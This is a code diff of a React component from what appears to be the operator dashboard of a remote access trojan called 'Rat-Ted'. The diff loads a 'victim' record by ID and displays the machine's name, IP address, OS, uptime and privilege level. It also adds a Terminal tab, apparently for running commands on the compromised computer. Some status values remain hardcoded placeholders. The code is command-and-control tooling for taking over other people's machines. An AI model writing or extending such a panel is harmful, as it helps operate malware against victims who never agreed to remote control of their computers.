@@ -1,11 +1,38 @@
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
+import { useLocation } from "react-router-dom";
 import { FaCamera, FaFolder, FaSearch } from "react-icons/fa";
-import { MdComputer, MdInfo, MdNetworkWifi, MdSettings } from "react-icons/md"; // Import icons from react-icons
+import { MdComputer, MdInfo, MdNetworkWifi, MdSettings } from "react-icons/md";
+import { getVictim, runVictimCommand } from "../../service/api.service";
+import Terminal from "../../components/Terminal";
 
 const ClientDetail: React.FC = () => {
   const [tab, setTab] = useState("detail");
+  const [client, setClient] = useState<Victim>();
+  const location = useLocation();
 
-  const client = {
+  useEffect(() => {
+    const fetchClient = async () => {
+      // Example URL: http://localhost:5173/dashboard#client?id=119384632345157
+
+      // Extract the hash part of the URL
+      const hash = location.hash;
+
+      // Use a regular expression to find the 'id' query parameter in the hash
+      const match = hash.match(/id=([^&]+)/);
+
+      if (match) {
+        // Extract the 'id' value from the matched result
+        const clientId = match[1];
+
+        const response = await getVictim(clientId);
+        setClient(response.data.client);
+      }
+    };
+
+    fetchClient();
+  }, [location]);
+
+  /*const client = {
     id: 1,
     name: "Client 1",
     ipAddress: "127.0.0.1",
@@ -19,7 +46,7 @@ const ClientDetail: React.FC = () => {
     latency: "32 ms",
     privilege: "Admin",
     version: "1.0.0",
-  };
+  };*/
 
   return (
     <div className="container mx-auto">
@@ -31,16 +58,18 @@ const ClientDetail: React.FC = () => {
             <div className="w-16 h-16 rounded-full border-8 border-red-500 flex items-center justify-center">
               <div
                 className={`w-10 h-10 rounded-full ${
-                  client.status === "Online" ? "bg-green-500" : "bg-red-500"
+                  "Online".toLowerCase() === "online"
+                    ? "bg-green-500"
+                    : "bg-red-500"
                 }`}
               ></div>
             </div>
             <div className="ml-4">
               <h2 className="text-2xl font-semibold text-blue-700 dark:text-blue-300">
-                {client.name}
+                {client?.Name}
               </h2>
               <p className="text-gray-500 dark:text-gray-400">
-                IP Address: {client.ipAddress}
+                IP Address: {client?.IPv4}
               </p>
             </div>
           </div>
@@ -52,13 +81,13 @@ const ClientDetail: React.FC = () => {
                 className="text-gray-600 dark:text-gray-400"
               />
               <span className="text-sm text-gray-600 dark:text-gray-400 ml-1">
-                {client.platform}
+                {client?.System}
               </span>
             </div>
             <div>
               <MdInfo size={24} className="text-red-500" />
               <span className="text-sm text-red-500 ml-1">
-                {client.vitalInfo}
+                Dangerous Vulnerability
               </span>
             </div>
           </div>
@@ -83,6 +112,15 @@ const ClientDetail: React.FC = () => {
         >
           System
         </button>
+
+        <button
+          onClick={() => setTab("terminal")}
+          className={`py-2 px-4 hover:bg-blue-600 hover:text-white rounded-sm ${
+            tab === "terminal" ? "bg-blue-600 text-white" : ""
+          }`}
+        >
+          Terminal
+        </button>
         {/* Render content based on the tab */}
       </div>
 
@@ -95,19 +133,19 @@ const ClientDetail: React.FC = () => {
             </h1>
             <div className="bg-white dark:bg-gray-900 rounded-lg p-4 shadow-md mt-4">
               <p className="text-gray-500 dark:text-gray-400">
-                Computer Name: {client.name}
+                Computer Name: {client?.Name}
               </p>
               <p className="text-gray-500 dark:text-gray-400">
-                OS Platform: {client.platform}
+                OS Platform: {client?.System}
               </p>
               <p className="text-gray-500 dark:text-gray-400">
-                OS Version: {client.osVersion}
+                OS Version: {client?.Version}
               </p>
               <p className="text-gray-500 dark:text-gray-400">
-                System Uptime: {client.uptime}
+                System Uptime: {client?.Uptime}
               </p>
               <p className="text-gray-500 dark:text-gray-400">
-                Idle Time: {client.idleTime}
+                Idle Time: 50 minutes
               </p>
             </div>
           </div>
@@ -121,32 +159,32 @@ const ClientDetail: React.FC = () => {
                 Status:{" "}
                 <span
                   className={`${
-                    client.status === "Online"
+                    "Online".toLowerCase() === "online"
                       ? "text-green-500"
                       : "text-red-500 "
                   }`}
                 >
-                  {client.status}
+                  Online
                 </span>
               </p>
               <p className="text-gray-500 dark:text-gray-400">
                 Latency:{" "}
                 <span
                   className={`
-                  ${parseInt(client.latency) < 50 && "text-green-500"}
+                  ${parseInt("32") < 50 && "text-green-500"}
                   ${
-                    parseInt(client.latency) > 50 &&
-                    parseInt(client.latency) < 99 &&
+                    parseInt("32") > 50 &&
+                    parseInt("32") < 99 &&
                     "text-yellow-500"
                   }
-                  ${parseInt(client.latency) > 99 && "text-red-500"}
+                  ${32 > 99 && "text-red-500"}
                 `}
                 >
-                  {client.latency}
+                  32
                 </span>
               </p>
               <p className="text-gray-500 dark:text-gray-400">
-                IP Address: {client.ipAddress}
+                IP Address: {client?.IPv4}
               </p>
             </div>
           </div>
@@ -157,10 +195,10 @@ const ClientDetail: React.FC = () => {
             </h1>
             <div className="bg-white dark:bg-gray-900 rounded-lg p-4 shadow-md mt-4">
               <p className="text-gray-500 dark:text-gray-400">
-                Privilege Level: {client.privilege}
+                Privilege Level: {client?.Privileges}
               </p>
               <p className="text-gray-500 dark:text-gray-400">
-                Rat-Ted Version: {client.version}
+                Rat-Ted Version: {client?.RatTedVersion}
               </p>
             </div>
           </div>
@@ -217,6 +255,12 @@ const ClientDetail: React.FC = () => {
               </button>
             </div>
           </div>
+        </div>
+      )}
+
+      {tab === "terminal" && (
+        <div className="mt-4">
+          <Terminal id={client?.ID || ""} />
         </div>
       )}
     </div>
